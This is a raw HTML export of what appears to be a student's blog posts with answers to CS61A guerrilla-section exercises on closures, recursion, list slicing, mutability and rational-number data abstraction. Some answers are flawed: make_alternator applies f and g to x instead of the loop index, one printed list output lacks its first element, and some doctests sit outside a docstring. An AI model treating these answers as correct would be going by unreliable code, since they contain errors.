<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># My solution</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_skipper</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a = make_skipper(2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a(5)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">skipper</span><span class="params">(x)</span>:</span></span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i &lt;= x:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> i % n == <span class="number">0</span>:</span><br><span class="line">                print(i)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> skipper</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PDF's solution which uses range(range(start, stop[, step]))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_skipper</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">skipper</span><span class="params">(x)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> i % n != <span class="number">0</span>:</span><br><span class="line">                print(i)</span><br><span class="line">    <span class="keyword">return</span> skipper</span><br></pre></td></tr></table></figure>
<h2 id="EXTRA-Question-2"><a href="#EXTRA-Question-2" class="headerlink" title="EXTRA:Question 2"></a>EXTRA:Question 2</h2><p>Write make_alternator which takes in two functions, f and g, and outputs a function. When this function takes in a number x, it prints out all the numbers between 1 and x, applying the function f to every odd-indexed number and g to every even-indexed number before printing.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_alternator</span><span class="params">(f, g)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a = make_alternator(lambda x: x * x, lambda x: x + 4)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; a(5)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    9</span></span><br><span class="line"><span class="string">    8</span></span><br><span class="line"><span class="string">    25</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; b = make_alternator(lambda x: x * 2, lambda x: x + 2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; b(4)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    4</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">alternator</span><span class="params">(x)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, x + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                print(f(x))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(g(x))</span><br><span class="line">    <span class="keyword">return</span> alternator</span><br></pre></td></tr></table></figure>
<h1 id="Recursion"><a href="#Recursion" class="headerlink" title="Recursion"></a>Recursion</h1><h2 id="Question-0"><a href="#Question-0" class="headerlink" title="Question 0"></a>Question 0</h2><p>a)​ What are three things you find in every recursive function?<br>1.<span style="color:red">One or more Base Cases</span><br>2.<span style="color:red">Ways to make the problem into a smaller problem of the same type(so that it can be solved recursively).</span><br>3.<span style="color:red">One or more Recursive Cases that solve the smaller problem and then uses the solution the smaller problem to solve the original(large) problem</span><br>b)​ When you write a Recursive function, you seem to call it before it has been fully defined. Why doesn’t this break the Python interpreter? Explain in haiku if possible.<br><span style="color:red">When you define a function, Python does not evaluate the body of the function.<br>Python does not care<br>about a function’s body<br>until it is called</span></p>
<h2 id="Question-1"><a href="#Question-1" class="headerlink" title="Question 1"></a>Question 1</h2><p>Question 1<br>Hint:​ Domain is the type of data that a function takes in as argument. The Range is the type of data that a function returns.<br>E.g. the domain of the function square is numbers. The range is numbers.<br>a)​ Here is a Python function that computes the nth Fibonnaci number. What’s it’s domain and range? Identify those three things from <strong>Q0a</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span> <span class="comment"># Domain is integers, Range is integers</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>: <span class="comment"># base case</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> n == <span class="number">1</span>: <span class="comment"># another base case</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># ONE recursive CASE with TWO recursive CALLS</span></span><br><span class="line">        <span class="keyword">return</span> fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>) <span class="comment">#reducing the problem</span></span><br></pre></td></tr></table></figure>
<p>Write out the recursive calls made when we do fib(4) (this will look like an upside down tree).</p>


<p>b)​ What does the following cascade2 do?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cascade2</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Print a cascade of prefixes of n."""</span></span><br><span class="line">    print(n)</span><br><span class="line">    <span class="keyword">if</span> n &gt;= <span class="number">10</span>:</span><br><span class="line">        cascade2(n//<span class="number">10</span>)</span><br><span class="line">        print(n)</span><br></pre></td></tr></table></figure>
<p><span style="color:red">Takes in a number n and prints out n, n excluding the ones digit, n excluding the tens digit, n excluding the hundreds digit, etc, then back up to the full number</span></p>
<p>c)​ Describe what does each of the following functions mystery and fooply do. Identify the three things from Q0a:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">mystery</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">return</span> n + mystery(n - <span class="number">1</span>)</span><br><span class="line">Sum integers up to n: <span class="number">1</span> + <span class="number">2</span> + <span class="number">3</span> + ... + n</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> foo(n - <span class="number">2</span>) + foo(n - <span class="number">1</span>)</span><br><span class="line">Returns the nth fibonacci number</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">fooply</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> foo(n) + fooply(n - <span class="number">1</span>)</span><br><span class="line">Returns the sum of first n fibnacci number</span><br></pre></td></tr></table></figure>
<h2 id="Question-2"><a href="#Question-2" class="headerlink" title="Question 2"></a>Question 2</h2><p>Mario needs to jump over a series of Piranha plants, represented as an integer composed of 0’s and 1’s. Mario only moves forward and can either step (move forward one space) or jump (move forward two spaces) from each position. How many different ways can Mario traverse a level without stepping or jumping into a Piranha plant? Assume that every level begins with a 1 (where Mario starts) and ends with a 1 (where Mario must end up).<br><span style="color:red">The problem seems to be unclear, I don’t know how to understand this.The solution just copies from the PDF</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mario_number</span><span class="params">(level)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Return the number of ways that Mario can traverse the level,</span></span><br><span class="line"><span class="string">    where Mario can either hop by one digit or two digits each turn. A level is defined as being an integer with digits where a 1 is something Mario can step on and 0 is something Mario cannot step on.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; mario_number(10101) # Hops each turn: (1, 2, 2)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; mario_number(11101) # Hops each turn: (1, 1, 1, 2), (2, 1, 2)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; mario_number(100101)# No way to traverse through level</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> level == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> level % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> mario_number(level // <span class="number">10</span>) + mario_number((level // <span class="number">10</span>) // <span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<h2 id="EXTRA-Challage-Question-3"><a href="#EXTRA-Challage-Question-3" class="headerlink" title="EXTRA Challage: Question 3"></a>EXTRA Challage: Question 3</h2><p>Implement the combine function, which takes a non-negative integer n, a two-argument function f, and a number result. It applies f to the first digit of n and the result of combining the rest of the digits of n by repeatedly applying f (see the doctests). If n has no digits (because it is zero), combine returns result. Assume n is non negative.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> add, mul</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combine</span> <span class="params">(n , f , result )</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Combine the digits in n using f.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; combine (3, mul, 2) # mul (3, 2)</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; combine (43, mul, 2) # mul (4, mul (3, 2))</span></span><br><span class="line"><span class="string">    24</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; combine (6502, add, 3) # add (6, add (5, add (0, add (2 , 3)))</span></span><br><span class="line"><span class="string">    16</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; combine (239, pow, 0) # pow (2, pow (3, pow (9, 0)))</span></span><br><span class="line"><span class="string">    8</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> combine(n // <span class="number">10</span>, f, f(n % <span class="number">10</span>, result))</span><br></pre></td></tr></table></figure>
<p>The iteration code of this problem may be like this</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> add, mul</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combine</span> <span class="params">(n , f , result)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Combine the digits in n using f.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; combine (3, mul, 2) # mul (3, 2)</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; combine (43, mul, 2) # mul (4, mul (3, 2))</span></span><br><span class="line"><span class="string">    24</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; combine (6502, add, 3) # add (6, add (5, add (0, add (2 , 3)))</span></span><br><span class="line"><span class="string">    16</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; combine (239, pow, 0) # pow (2, pow (3, pow (9, 0)))</span></span><br><span class="line"><span class="string">    8</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        n, i = n // <span class="number">10</span>, n % <span class="number">10</span></span><br><span class="line">        result = f(i, result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<p>So we can simply transform the code from iteration to recursion, only need to keep the necessary state.</p>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-guerrilla03</title>
    <url>/2018/10/09/cs61a-guerrilla03/</url>
    <content><![CDATA[<h2 id="Sequences"><a href="#Sequences" class="headerlink" title="Sequences"></a>Sequences</h2><h3 id="Question-0"><a href="#Question-0" class="headerlink" title="Question 0"></a>Question 0</h3><p>Fill out what python would display at each step if applicable.<br>Note:​ (keep in mind list slicing creates a brand new list, does not modify existing list)<br>i.</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst[<span class="number">1</span>:<span class="number">3</span>]</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst[<span class="number">0</span>:len(lst)]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst[<span class="number">-4</span>:]</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst[:<span class="number">3</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst[<span class="number">3</span>:]</span><br><span class="line">[<span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst[:]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<p>ii. Hint: ​You can also specify the increment step-size for slicing. The notation is lst[start:end:step].<br>Remember that a negative step size changes the default start and end.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst[<span class="number">1</span>:<span class="number">4</span>:<span class="number">2</span>]</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst[<span class="number">0</span>:<span class="number">4</span>:<span class="number">3</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst[:<span class="number">4</span>:<span class="number">2</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst[<span class="number">1</span>::<span class="number">2</span>]</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst[::<span class="number">2</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst[::<span class="number">-1</span>]</span><br><span class="line">[<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst2 = [<span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst + lst2</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst + <span class="number">100</span></span><br><span class="line">TypeError</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst3 = [[<span class="number">1</span>], [<span class="number">2</span>], [<span class="number">3</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst + lst3</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, [<span class="number">1</span>], [<span class="number">2</span>], [<span class="number">3</span>]]</span><br></pre></td></tr></table></figure>
<h3 id="Question-1"><a href="#Question-1" class="headerlink" title="Question 1"></a>Question 1</h3><p>Draw the environment diagram that results from running the code below</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse</span><span class="params">(lst)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(lst) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> lst</span><br><span class="line">    <span class="keyword">return</span> reverse(lst[<span class="number">1</span>:]) + [lst[<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line">lst = [<span class="number">1</span>, [<span class="number">2</span>, <span class="number">3</span>], <span class="number">4</span>]</span><br><span class="line">rev = reverse(lst)</span><br></pre></td></tr></table></figure>


<h3 id="EXTRA-Question-2"><a href="#EXTRA-Question-2" class="headerlink" title="EXTRA: Question 2"></a>EXTRA: Question 2</h3><p>Write <code>combine_skipper</code>, which takes in a function <code>f</code> and list <code>lst</code> and outputs a list. When this function takes in a list <code>lst</code>, it looks at the list in chunks of four and applies <code>f</code> to the first two elements in every set of four elements and replaces the first element with the output of the function f applied to the two elements as the first value and the index of the second item of the original two elements as the second value of the new two elements. <code>f</code> takes in a list and outputs a value. [Assume the length of <code>lst</code> will always be divisible by four]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combine_skipper</span><span class="params">(f, lst)</span>:</span></span><br><span class="line">    &gt;&gt;&gt; lst = [<span class="number">4</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">    &gt;&gt;&gt; f = <span class="keyword">lambda</span> l: sum(l)</span><br><span class="line">    &gt;&gt;&gt; lst = combine_skipper(f, lst)</span><br><span class="line">    &gt;&gt;&gt; lst</span><br><span class="line">    [<span class="number">11</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">    &gt;&gt;&gt; lst2 = [<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">    &gt;&gt;&gt; lst2 = combine_skipper(f, lst2)</span><br><span class="line">    &gt;&gt;&gt; lst2</span><br><span class="line">    [<span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; len(lst) // <span class="number">4</span>:</span><br><span class="line">        lst[<span class="number">4</span>*n:<span class="number">4</span>*n+<span class="number">2</span>] = [f(lst[<span class="number">4</span>*n:<span class="number">4</span>*n+<span class="number">2</span>])] + [<span class="number">4</span>*n+<span class="number">1</span>]</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> lst</span><br></pre></td></tr></table></figure>
<h2 id="Mutability"><a href="#Mutability" class="headerlink" title="Mutability"></a>Mutability</h2><h3 id="Question-0-1"><a href="#Question-0-1" class="headerlink" title="Question 0"></a>Question 0</h3><p>a. ​Name two data types that are mutable. What does it mean to be mutable?<br><span style="color:red">Dictionaries, lists</span><br>b. ​Name two data types that are not mutable.<br><span style="color:red">Tuples, functions, int, float</span></p>
<h3 id="Question-1-1"><a href="#Question-1-1" class="headerlink" title="Question 1"></a>Question 1</h3><p>a. ​Will the following code error? Why?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dt = &#123;a: <span class="number">1</span>, b: <span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">No, a and b are immutable type</span><br>b. ​Will the following code error? Why?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="number">2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dt = &#123;a: <span class="number">1</span>, b: <span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">Yes, a and b are mutable types</span></p>
<h3 id="Question-2"><a href="#Question-2" class="headerlink" title="Question 2"></a>Question 2</h3><p>a.​ Fill in the output and draw a box-and-pointer diagram for the following code. If an error occurs, write “Error”, but include all output displayed before the error.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, [<span class="number">2</span>, <span class="number">3</span>], <span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = a[<span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.append(c)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">1</span>, [<span class="number">2</span>, <span class="number">3</span>], <span class="number">4</span>, [<span class="number">2</span>, <span class="number">3</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">1</span>, [<span class="number">0</span>, <span class="number">3</span>], <span class="number">4</span>, [<span class="number">0</span>, <span class="number">3</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.extend(c)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c[<span class="number">1</span>] = <span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[, [<span class="number">0</span>, <span class="number">9</span>], <span class="number">4</span>, [<span class="number">0</span>, <span class="number">9</span>], <span class="number">0</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure>



<p>b.​ Fill in the output and draw a box-and-pointer diagram for the following code. If an error occurs, write “Error”, but include all output displayed before the error.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>risk = [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst, risk = risk, lst</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lst <span class="keyword">is</span> risk</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mist = risk</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>risk = risk[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mist.insert(<span class="number">-1</span>, <span class="number">99</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>risk[<span class="number">-1</span>]</span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="comment"># Hint: Try drawing the result of [y + 1 for y in mist] first.</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>risk = [x <span class="keyword">for</span> x <span class="keyword">in</span> [y + <span class="number">1</span> <span class="keyword">for</span> y <span class="keyword">in</span> mist] <span class="keyword">if</span> x % <span class="number">10</span> != <span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>risk</span><br><span class="line">[<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>er = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>er.extend(risk.pop())</span><br><span class="line">Error</span><br></pre></td></tr></table></figure>



<h2 id="Data-Abstraction"><a href="#Data-Abstraction" class="headerlink" title="Data Abstraction"></a>Data Abstraction</h2><h3 id="Question-1-2"><a href="#Question-1-2" class="headerlink" title="Question 1"></a>Question 1</h3><p>a.​ Why are Abstract Data Types useful?</p>
<ul>
<li>More readable code.</li>
<li>Constructors and selectors have human-readable names.</li>
<li>Makes collaboration easier.</li>
<li>Other programmers don’t have to worry about implementation details.</li>
<li>Prevents error propagation.</li>
<li>Fix errors in a single function rather than all over your program.<br>b.​ What are the two types of functions necessary to make an Abstract Data Type? Describe what they do.</li>
<li>Constructors make the ADT.</li>
<li>Selectors take instances of the ADT and output relevant information stored in it.<br>c.​ What is a Data Abstraction Violation?<br>Put simply, a Data Abstraction Violation is when you bypass the constructors and selectors for an ADT, and directly use how it’s implemented in the rest of your code, thus assuming that its implementation will not change.<br>d.​ Why is it a terrible sin to commit a Data Abstraction Violation?<br>We cannot assume we know how the ADT is constructed except by using constructors and likewise, we cannot assume we know how to access details of our ADT except through selectors. The details are supposed to be abstracted away by the constructors and selectors. If we bypass the constructors and selectors and access the details directly, any small change to the implementation of our ADT could break our entire program.</li>
</ul>
<h3 id="Question-2-1"><a href="#Question-2-1" class="headerlink" title="Question 2"></a>Question 2</h3><p>In lecture, we discussed the rational data type, which represents fractions with the following methods:<br>• rational(n, d) - constructs a rational number with numerator n, denominator d<br>• numer(x) - returns the numerator of rational number x<br>• denom(x) - returns the denominator of rational number x<br>We also presented the following methods that perform operations with rational numbers:<br>• add_rationals(x, y)<br>• mul_rationals(x, y)<br>• rationals_are_equal(x, y)<br>You’ll soon see that we can do a lot with just these simple methods in the exercises below.<br>a​. Write a function that returns the given rational number x raised to positive power e.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> pow</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational_pow</span><span class="params">(x, e)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; r = rational_pow(rational(2, 3), 2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; numer(r)</span></span><br><span class="line"><span class="string">    4</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; denom(r)</span></span><br><span class="line"><span class="string">    9</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; r2 = rational_pow(rational(9, 72), 0)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; numer(r2)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; denom(r2)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> rational(pow(numer(x), e), pow(denom(x), e))</span><br></pre></td></tr></table></figure>
<p>b​. Implement the following rational number methods.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_rational</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">""" Returns the inverse of the given non-zero rational number</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; r = rational(2, 3)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; r_inv = inverse_rational(r)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; numer(r_inv)</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; denom(r_inv)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; r2 = rational_pow(rational(3, 4), 2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; r2_inv = inverse_rational(r2)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; numer(r2_inv)</span></span><br><span class="line"><span class="string">    16</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; denom(r2_inv)</span></span><br><span class="line"><span class="string">    9</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> rational(denom(x), numer(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">div_rationals</span><span class="params">(x, y)</span>:</span> <span class="comment"># Hint: Use functions defined in Question 2</span></span><br><span class="line">    <span class="string">""" Returns x / y for given rational x and non-zero rational y</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; r1 = rational(2, 3)</span></span><br><span 